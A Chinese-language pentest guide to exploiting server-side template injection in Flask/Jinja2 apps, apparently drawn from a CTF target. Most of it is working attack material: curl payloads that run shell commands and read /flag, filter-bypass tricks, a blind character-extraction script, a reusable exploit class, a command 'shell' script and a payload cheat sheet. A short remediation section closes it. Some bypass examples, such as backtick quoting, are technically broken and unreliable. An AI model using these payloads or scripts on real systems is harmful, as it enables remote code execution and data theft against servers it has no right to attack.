# Flask Jinja2 模板注入（SSTI）攻击

## 1. 概述

### 1.1 漏洞原理

Flask 应用使用 Jinja2 模板引擎进行服务器端渲染。当开发者使用 `render_template_string()` 函数并将用户输入直接嵌入到模板字符串中时，攻击者可以注入 Jinja2 模板语法，进而执行任意 Python 代码，实现远程代码执行（RCE）。

**核心漏洞模式：**
```python
# 危险模式 - 用户输入直接嵌入 f-string
term = request.args.get('term', type=str)
template = f"{{% for row in range({term}) %}}"  # 单大括号 - 直接插值
render_template_string(template)
```

**安全模式对比：**
```python
# 安全模式 - 用户输入作为模板变量传递
principal = request.args.get('principal', type=str)
template = f"{{{{ principal }}}}"  # 四大括号 - 转义为 Jinja2 占位符
render_template_string(template, principal=principal)
```

### 1.2 适用范围

- Flask 应用使用 `render_template_string()` 处理用户输入
- Django 应用使用 `Template()` 处理用户输入
- 任何使用 Jinja2 模板引擎的 Python Web 应用
- 用户输入通过 f-string 或字符串拼接嵌入模板

### 1.3 读者对象

- 渗透测试工程师
- 安全研究人员
- Web 应用安全审计人员

---

## 2. 漏洞探测方法

### 2.1 注入点识别

**输入点特征：**
- URL 查询参数（如 `?term=60`）
- POST 表单数据
- HTTP 头部值
- Cookie 值

**初步探测 Payload：**
```bash
# 算术表达式测试 - 确认参数被求值
curl -s 'http://target:port/endpoint?term=5*7'
# 期望：返回包含 35 行数据的响应（5*7=35）

# 字符串拼接测试
curl -s 'http://target:port/endpoint?name={{7*7}}'
# 期望：响应中包含 49
```

### 2.2 模板注入确认

**Jinja2 模板探测 Payload：**
```bash
# 访问模板全局对象
curl -s 'http://target:port/endpoint?term={{config}}'
# 期望：返回 Flask 配置对象信息

# 访问 lipsum 全局函数
curl -s 'http://target:port/endpoint?term={{lipsum}}'
# 期望：返回 lipsum 函数描述
```

### 2.3 黑名单识别

**常见黑名单过滤：**
```python
# 字符黑名单示例
if "{" in term or "}" in term or "%" in term:
    return Response('Forbidden characters', status=400)
```

**黑名单探测 Payload：**
```bash
# 测试字符过滤
curl -s 'http://target:port/endpoint?term={{7*7}}'  # 测试{}
curl -s 'http://target:port/endpoint?term={%257*7%25}'  # URL 编码%
curl -s 'http://target:port/endpoint?term=7*7'  # 无特殊字符
```

---

## 3. 漏洞利用方法

### 3.1 基础信息收集

**访问 Python 全局命名空间：**
```bash
# 通过 lipsum 访问 __globals__
curl -s 'http://target:port/endpoint?term=lipsum.__globals__'

# 访问内置函数
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__builtins__'

# 枚举可用模块
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.keys()'
```

### 3.2 远程代码执行（RCE）

**方法一：通过 os 模块执行命令**
```bash
# 使用 lipsum.__globals__访问 os 模块
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os").system("id")+or+5'

# 使用 popen 捕获命令输出
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os").popen("whoami").read().__len__()+or+5'
# 响应行数 = 用户名长度 +1
```

**方法二：通过 builtins 执行代码**
```bash
# 访问 eval 函数
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("builtins").eval("5*7")'

# 访问 __import__ 动态导入模块
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("builtins").__import__("os").system("id")'
```

### 3.3 文件读取利用

**读取敏感文件：**
```bash
# 直接读取文件（输出长度）
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os").popen("cat /flag").read().__len__()+or+5'

# 存储文件内容到全局变量
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.update(flag=open("/flag").read())+or+42'
# 响应 42 行表示成功存储
```

### 3.4 盲注数据外带技术

**字符级提取方法：**
```bash
# 验证 flag 前缀
curl -s 'http://target:port/endpoint?term=100+if+lipsum.__globals__.get("flag","")[0]=="f"+else+1'
# 响应 100 行表示第一个字符是'f'

# 提取 UUID 部分
curl -s 'http://target:port/endpoint?term=100+if+lipsum.__globals__.get("flag","")[5:41]=="90f2407f-0723-4fa1-a104-d5d8450bcded"+else+1'
# 响应 100 行表示匹配成功
```

**自动化提取脚本：**
```python
#!/usr/bin/env python3
import requests

TARGET = "http://localhost:37579/amortization"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789-_"

def extract_flag():
    # 先存储 flag 到全局变量
    requests.get(f"{TARGET}?term=lipsum.__globals__.update(flag=open('/flag').read())+or+42")
    
    flag = ""
    for i in range(50):  # 最多提取 50 个字符
        for char in CHARSET:
            payload = f"100+if+lipsum.__globals__.get('flag','')[{i}]==\"{char}\"+else+1"
            response = requests.get(f"{TARGET}?term={payload}")
            if response.text.count('<tr>') == 100:  # 100 行表示匹配成功
                flag += char
                print(f"[+] Position {i}: {char} -> Flag: {flag}")
                break
    return flag

if __name__ == "__main__":
    flag = extract_flag()
    print(f"[✓] Extracted Flag: {flag}")
```

### 3.5 黑名单绕过技术

**绕过{、}、% 过滤：**
```bash
# 方法 1：使用 URL 编码
curl -s 'http://target:port/endpoint?term=%7B%7B7*7%7D%7D'

# 方法 2：使用 Python 表达式（不需要模板语法）
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os").system("id")+or+5'

# 方法 3：使用注释绕过
curl -s 'http://target:port/endpoint?term=60).__import__("os").popen("cat /flag").read()#'
```

**绕过引号过滤：**
```bash
# 使用单引号代替双引号
curl -s "http://target:port/endpoint?term=lipsum.__globals__.__getitem__('os').system('id')+or+5"

# 使用反引号
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__(`os`).system(`id`)+or+5'

# 使用字符串拼接
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("o"+"s").system("i"+"d")+or+5'
```

**绕过空格过滤：**
```bash
# 使用 Tab 代替空格
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os").popen("cat${IFS}/flag").read()+or+5'

# 使用注释代替空格
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__getitem__("os")/**/system("id")+or+5'
```

---

## 4. 高级利用技术

### 4.1 通过 config 全局命名空间执行命令

```bash
# 访问 Flask 配置对象
curl -s 'http://target:port/endpoint?term={{config}}'

# 通过 config 访问应用对象
curl -s 'http://target:port/endpoint?term={{config.__class__.__init__.__globals__}}'

# 执行命令
curl -s 'http://target:port/endpoint?term={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
```

### 4.2 通过 request 对象执行命令

```bash
# 访问 request 全局对象
curl -s 'http://target:port/endpoint?term={{request}}'

# 通过 request 访问应用
curl -s 'http://target:port/endpoint?term={{request.application.__globals__.__builtins__.__import__("os").system("id")}}'
```

### 4.3 利用子类枚举（Subclasses Enumeration）

```bash
# 枚举所有子类
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__builtins__.__dict__.keys()'

# 访问特定类
curl -s 'http://target:port/endpoint?term=lipsum.__globals__.__builtins__.__dict__["__import__"]("os").system("id")'
```

---

## 5. 自动化利用工具

### 5.1 快速利用脚本

```python
#!/usr/bin/env python3
"""
Flask Jinja2 SSTI 快速利用脚本
支持：RCE、文件读取、盲注提取
"""

import requests
import sys

class SSTIExploit:
    def __init__(self, target_url, param="term"):
        self.target = target_url
        self.param = param
        self.session = requests.Session()
    
    def test_injection(self):
        """测试 SSTI 注入点"""
        payload = "7*7"
        response = self.session.get(f"{self.target}?{self.param}={payload}")
        if "49" in response.text:
            print("[✓] SSTI injection confirmed")
            return True
        return False
    
    def rce(self, command):
        """执行任意命令"""
        payload = f'lipsum.__globals__.__getitem__("os").popen("{command}").read().__len__()+or+5'
        response = self.session.get(f"{self.target}?{self.param}={payload}")
        # 返回输出长度
        return response.text.count('<tr>') - 1
    
    def read_file(self, filepath):
        """读取文件内容（盲注方式）"""
        # 先存储到全局变量
        self.session.get(f"{self.target}?{self.param}=lipsum.__globals__.update(file_content=open('{filepath}').read())+or+42")
        
        # 逐字符提取
        charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}-!@#$%^&*()"
        content = ""
        for i in range(100):
            for char in charset:
                payload = f"100+if+lipsum.__globals__.get('file_content','')[{i}]==\"{char}\"+else+1"
                response = self.session.get(f"{self.target}?{self.param}={payload}")
                if response.text.count('<tr>') == 100:
                    content += char
                    print(f"[+] Position {i}: '{char}'")
                    break
        return content
    
    def get_flag(self, flag_path="/flag"):
        """获取 CTF Flag"""
        print(f"[*] Reading flag from {flag_path}...")
        
        # 存储 flag
        self.session.get(f"{self.target}?{self.param}=lipsum.__globals__.update(flag=open('{flag_path}').read())+or+42")
        
        # 验证前缀
        payload = '100+if+lipsum.__globals__.get("flag","")[0:4]=="flag"+else+1'
        response = self.session.get(f"{self.target}?{self.param}={payload}")
        if response.text.count('<tr>') == 100:
            print("[✓] Flag format confirmed: flag{...}")
        
        # 提取中间部分
        charset = "0123456789abcdef-"
        flag_middle = ""
        for i in range(5, 41):
            for char in charset:
                payload = f"100+if+lipsum.__globals__.get('flag','')[{i}]==\"{char}\"+else+1"
                response = self.session.get(f"{self.target}?{self.param}={payload}")
                if response.text.count('<tr>') == 100:
                    flag_middle += char
                    print(f"[+] Position {i}: '{char}' -> {flag_middle}")
                    break
        
        return f"flag{{{flag_middle}}}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    exploit = SSTIExploit(sys.argv[1])
    
    if exploit.test_injection():
        print(f"\n[✓] Flag: {exploit.get_flag()}")
```

### 5.2 交互式 Shell

```python
#!/usr/bin/env python3
"""
Flask SSTI 交互式 Shell
"""

import requests

TARGET = "http://localhost:37579/amortization"

def execute_command(cmd):
    payload = f'lipsum.__globals__.__getitem__("os").popen("{cmd}").read().__len__()+or+5'
    response = requests.get(f"{TARGET}?term={payload}")
    length = response.text.count('<tr>') - 1
    return length

def interactive_shell():
    print("[*] SSTI Interactive Shell")
    print("[*] Type 'exit' to quit")
    
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() in ['exit', 'quit']:
            break
        if cmd:
            length = execute_command(cmd)
            print(f"[Output length: {length} characters]")

if __name__ == "__main__":
    interactive_shell()
```

---

## 6. 常见 Payload 速查表

| 目标 | Payload | 说明 |
|------|---------|------|
| 确认注入 | `{{7*7}}` | 返回 49 表示注入成功 |
| 访问全局对象 | `{{lipsum.__globals__}}` | 访问 Python 全局命名空间 |
| 访问内置函数 | `{{lipsum.__globals__.__builtins__}}` | 访问 builtins 模块 |
| 执行命令 | `{{lipsum.__globals__.__getitem__("os").system("id")}}` | 执行系统命令 |
| 读取文件 | `{{lipsum.__globals__.__getitem__("os").popen("cat /flag").read()}}` | 读取文件内容 |
| 导入模块 | `{{lipsum.__globals__.__builtins__.__import__("os")}}` | 动态导入模块 |
| 访问 config | `{{config}}` | 访问 Flask 配置对象 |
| 访问 request | `{{request}}` | 访问 request 对象 |
| 盲注判断 | `100+if+lipsum.__globals__.get("flag","")[0]=="f"+else+1` | 条件判断 |
| 黑名单绕过 | `60).__import__("os").popen("id").read()#` | 不使用模板语法 |

---

## 7. 修复建议

### 7.1 安全编码实践

**不要使用 render_template_string 处理用户输入：**
```python
# 错误示例
template = f"{{% for i in range({user_input}) %}}"
render_template_string(template)

# 正确示例
template = "{% for i in range(value) %}"
render_template_string(template, value=int(user_input))
```

**使用 render_template 代替：**
```python
# 安全方式 - 模板文件
return render_template('template.html', value=user_input)
```

### 7.2 输入验证

```python
# 白名单验证
import re
if not re.match(r'^\d+$', user_input):
    abort(400)
```

### 7.3 沙箱环境

```python
# 使用 SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
# 限制可用全局对象
```

---

## 8. 参考资源

- [Jinja2 Template Injection - PortSwigger](https://portswigger.net/web-security/server-side-template-injection)
- [Flask SSTI Exploitation - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
